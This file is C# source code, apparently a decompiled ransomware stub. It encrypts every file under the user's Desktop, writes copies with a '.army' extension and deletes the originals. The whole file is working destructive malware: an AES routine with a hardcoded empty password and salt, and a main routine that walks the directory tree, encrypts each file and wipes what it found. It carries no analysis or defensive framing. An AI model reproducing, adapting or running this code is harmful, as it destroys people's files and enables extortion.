using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub;

public class Main
{
	public static byte[] AESEncrypt(byte[] PlainText, string Password, string salt, string Ini)
	{
		//Discarded unreachable code: IL_00cc, IL_00da
		string strHashName = "SHA1";
		string text = Conversions.ToString(2);
		int num = 256;
		byte[] bytes = Encoding.ASCII.GetBytes(Ini);
		byte[] bytes2 = Encoding.ASCII.GetBytes(salt);
		PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(Password, bytes2, strHashName, Conversions.ToInteger(text));
		byte[] bytes3 = passwordDeriveBytes.GetBytes(checked((int)Math.Round((double)num / 8.0)));
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.Mode = CipherMode.ECB;
		byte[] result = null;
		using (ICryptoTransform transform = rijndaelManaged.CreateEncryptor(bytes3, bytes))
		{
			using MemoryStream memoryStream = new MemoryStream();
			using CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
			cryptoStream.Write(PlainText, 0, PlainText.Length);
			cryptoStream.FlushFinalBlock();
			result = memoryStream.ToArray();
			memoryStream.Close();
			cryptoStream.Close();
		}
		rijndaelManaged.Clear();
		return result;
	}

	[STAThread]
	public static void Main()
	{
		object folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		File.Delete(Conversions.ToString(Operators.ConcatenateObject(folderPath, (object)"\\desktop.ini")));
		string[] files = Directory.GetFiles(Conversions.ToString(folderPath), "*.*", SearchOption.AllDirectories);
		foreach (string text in files)
		{
			byte[] plainText = File.ReadAllBytes(text);
			byte[] bytes = AESEncrypt(plainText, "", "your files are encrypted", "your files are encrypted");
			File.WriteAllBytes(text + ".army", bytes);
		}
		string[] files2 = Directory.GetFiles(Conversions.ToString(folderPath), "*.*", SearchOption.AllDirectories);
		foreach (object obj in files2)
		{
			if (!Conversions.ToBoolean(NewLateBinding.LateGet(obj, (Type)null, "Contains", new object[1] { ".army" }, (string[])null, (Type[])null, (bool[])null)))
			{
				File.Delete(Conversions.ToString(obj));
			}
		}
	}
}
